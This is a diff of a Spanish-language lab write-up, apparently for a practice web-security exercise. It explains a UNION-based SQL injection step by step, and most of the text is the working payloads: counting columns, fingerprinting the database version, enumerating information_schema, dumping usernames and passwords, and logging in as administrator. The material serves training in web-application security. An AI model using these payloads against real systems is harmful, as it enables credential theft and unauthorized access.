@@ -1,11 +1,7 @@
-Objetivo: Conocer que tabla contiene los nombre de usuario y la contraseña.
- - Conocer las tablas importantes
- - Contenido de las tablas
- - Logearnos como el usuario administrador
 
-Consulta Original: `SELECT * FROM articles WHERE category='Gifts'`
+Para resolver el laboratorio, realice un ataque de inyección SQL UNION que recupere todos los nombres de usuario y contraseñas, y utilice la información para iniciar sesión como usuario `administrator`
 
-![[Pasted image 20250718165549.png]]
+![[Pasted image 20250721205714.png]]
 
 #### Averiguar la cantidad de columnas que tiene la tabla en uso:
 ****
@@ -16,12 +12,13 @@ Consulta para averiguar la cantidad de columnas de la tabla en uso: `SELECT * FR
 
 Consulta (UNION): `SELECT * FROM articles WHERE category='Gifts' UNION SELECT "a","b"-- -'`
 
-![[Pasted image 20250718170140.png]]
+![[Pasted image 20250721205818.png]]
+
+La tabla actual en uso tiene dos columnas, ahora debemos conocer a que BBDD nos estamos enfrentando.
 
 #### Averiguar a qué Base de Datos nos estamos enfrentando
 ****
 Cada gestor de bases de datos tiene su forma de consultar la versión de la misma, de colocar comentarios, etc. Por lo tanto tendremos en cuenta lo siguiente al querer averiguar la versión.
-
 ##### Database version
 
 | Gestor     | Consulta                                                           |
@@ -30,12 +27,9 @@ Cada gestor de bases de datos tiene su forma de consultar la versión de la mism
 | Microsoft  | `SELECT @@version`                                                 |
 | PostgreSQL | `SELECT version()`                                                 |
 | MySQL      | `SELECT @@version`                                                 |
-Consulta PostgreSQL: `SELECT * FROM articles WHERE category='Gifts' UNION SELECT version(),NULL-- -'`
+Consulta utilizada para averiguar la version de la BBDD: `' UNION SELECT NULL,version()-- -`
 
-![[Pasted image 20250718171306.png]]
-![[Pasted image 20250718171328.png]]
-
-Ahora que sabemos la versión de la base de datos que corre por detrás, debemos conocer cuáles son las tablas que existen dentro de la DB.
+![[Pasted image 20250721210053.png]]
 
 #### Conocer la tabla que almacena los usuarios y las contraseñas.
 ****
@@ -44,35 +38,31 @@ Para ello, haremos uso de `information_schema`
 - `information_schema.tables` -> Tablas existentes
 - `information_schema.columns` -> Columnas existentes
 
-Consulta para ver las Bases de datos existentes: `' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -`
+Consulta para ver las Bases de datos existentes: `' UNION SELECT NULL,schema_name FROM information_schema.schemata-- -`
 
-El `NULL` es el valor que va en la segunda columna de la tabla.
- 
-![[Pasted image 20250718173103.png]]
+![[Pasted image 20250721210239.png]]
 
 Vemos que hay 3 bases de datos, la que a nosotros nos interesa es la `public`. Lo siguiente que queremos hacer es ver las tablas existentes dentro de la base de datos `public`. Para ello, usaremos la siguiente consulta:
 
-Consulta para averiguar las tablas de una Base de dato específica: `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -`
+Consulta para averiguar las tablas de una Base de dato específica: `' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='public'-- -`
 
-![[Pasted image 20250718181406.png]]
+![[Pasted image 20250721210421.png]]
 
-Aquí vemos dos tablas dentro de la base de datos  `public`: `products` y `users_xevxih`.
-En la tabla `users_xevxih` están almacenadas las credenciales.
+Aquí vemos dos tablas dentro de la base de datos  `public`: `products` y `users`.
+En la tabla `users` están almacenadas las credenciales.
 
-Consulta para conocer las columnas de una tabla: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xevxih'-- -`
+Consulta para conocer las columnas de una tabla: `' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'-- -`
 
-![[Pasted image 20250718182515.png]]
+![[Pasted image 20250721210529.png]]
 
-Vemos representadas las columnas de la tabla `users_xevxih`. Estas son: `password_eeqfiy`, `username_nzsgkn` y `email`. Ahora queremos conocer la contraseña del usuario `administrator`.
+Consulta para mostrar los datos de las columnas de forma concatenada: `'UNION SELECT NULL,username||':'||password FROM users-- -`
 
-Consulta para conocer la contraseña de un usuario: `' UNION SELECT username_nzsgkn,password_eeqfiy FROM users_xevxih WHERE username_nzsgkn='administrator'-- -`
-
-![[Pasted image 20250718183352.png]]
+![[Pasted image 20250721211139.png]]
 
 Aquí vemos representada el usuario y la contraseña del usuario `administrator`.
-
 #### Nos autenticamos como el usuario administrator
+****
 
-![[Pasted image 20250718183626.png]]
+![[Pasted image 20250721211246.png]]
 
-![[Pasted image 20250718183648.png]]
+![[Pasted image 20250721211354.png]]
